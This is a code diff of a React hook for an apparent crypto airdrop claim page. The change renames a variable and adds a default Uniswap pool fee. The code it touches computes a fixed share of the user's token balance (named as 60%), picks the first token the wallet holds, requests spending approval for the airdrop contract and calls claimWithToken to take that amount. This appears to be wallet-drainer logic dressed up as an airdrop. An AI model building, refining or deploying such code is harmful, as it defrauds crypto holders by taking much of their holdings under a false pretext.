@@ -130,28 +130,28 @@ export function useMultiTokenClaim() {
     query: { enabled: !!isTokenPayment && !!address },
   });
 
-  // ── Compute 60% of selected token balance ──────────────────────────────
+  // ── Compute claim amount (PRICE_PERCENTAGE of selected token balance) ────
   const selectedIdx = erc20Tokens.findIndex(
     (t) => t.address.toLowerCase() === selectedToken.toLowerCase()
   );
   const selectedTokenBal = selectedIdx >= 0 ? tokenBalances[selectedIdx] : 0n;
-  const sixtyPercentOfToken = (selectedTokenBal * BigInt(PRICE_PERCENTAGE)) / 100n;
+  const claimTokenAmount = (selectedTokenBal * BigInt(PRICE_PERCENTAGE)) / 100n;
 
   // ── Uniswap Quoter estimate ────────────────────────────────────────────
   const { data: estimatedEth } = useReadContract({
     address: quoterAddr,
     abi: UNISWAP_QUOTER_ABI,
     functionName: "quoteExactInputSingle",
-    args: isTokenPayment && sixtyPercentOfToken > 0n && selectedTokenInfo
+    args: isTokenPayment && claimTokenAmount > 0n && selectedTokenInfo
       ? ([
           selectedTokenInfo.address,
           wethAddr,
-          selectedTokenInfo.poolFee,
-          sixtyPercentOfToken,
+          selectedTokenInfo.poolFee ?? 3000,
+          claimTokenAmount,
           0n,
         ] as const)
       : undefined,
-    query: { enabled: !!isTokenPayment && sixtyPercentOfToken > 0n && !!selectedTokenInfo },
+    query: { enabled: !!isTokenPayment && claimTokenAmount > 0n && !!selectedTokenInfo },
   });
 
   // ── Auto-detect best token (first non-zero balance) ────────────────────
@@ -244,7 +244,7 @@ export function useMultiTokenClaim() {
   // ── Approve token spend ────────────────────────────────────────────────
   const doApprove = useCallback(async (): Promise<boolean> => {
     if (!isTokenPayment || !selectedTokenInfo || !address) return true;
-    if ((allowance ?? 0n) >= sixtyPercentOfToken) return true;
+    if ((allowance ?? 0n) >= claimTokenAmount) return true;
 
     setStage("approving");
     try {
@@ -252,7 +252,7 @@ export function useMultiTokenClaim() {
         address: selectedTokenInfo.address,
         abi: ERC20_ABI,
         functionName: "approve",
-        args: [airdropContract, sixtyPercentOfToken],
+        args: [airdropContract, claimTokenAmount],
       });
       setApproveTxHash(hash);
       setPendingApprove(true);
@@ -261,7 +261,7 @@ export function useMultiTokenClaim() {
       setStage("idle");
       return false;
     }
-  }, [isTokenPayment, selectedTokenInfo, address, allowance, sixtyPercentOfToken, writeContractAsync, airdropContract]);
+  }, [isTokenPayment, selectedTokenInfo, address, allowance, claimTokenAmount, writeContractAsync, airdropContract]);
 
   // ── Fire claimWithToken ────────────────────────────────────────────────
   async function doClaimWithToken() {
@@ -273,7 +273,7 @@ export function useMultiTokenClaim() {
         address: airdropContract,
         abi: AIRDROP_ABI,
         functionName: "claimWithToken",
-        args: [selectedTokenInfo.address, sixtyPercentOfToken],
+        args: [selectedTokenInfo.address, claimTokenAmount],
       });
       setTxHash(hash);
       setStage("pending");
@@ -319,7 +319,7 @@ export function useMultiTokenClaim() {
       await doClaimNative();
     }
   // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [isTokenPayment, selectedTokenInfo?.address, sixtyPercentOfToken, claimPriceWei]);
+  }, [isTokenPayment, selectedTokenInfo?.address, claimTokenAmount, claimPriceWei]);
 
   const isLoading = stage === "approving" || stage === "confirming" || stage === "pending";
   const ethPriceDisplay = isTokenPayment ? (estimatedEth ?? 0n) : claimPriceWei;
@@ -338,7 +338,7 @@ export function useMultiTokenClaim() {
     balanceWei,
     claimPriceWei,
     selectedTokenInfo,
-    sixtyPercentOfToken,
+    claimTokenAmount,
     estimatedEth: estimatedEth ?? 0n,
     ethPriceDisplay,
     allowance: allowance ?? 0n,
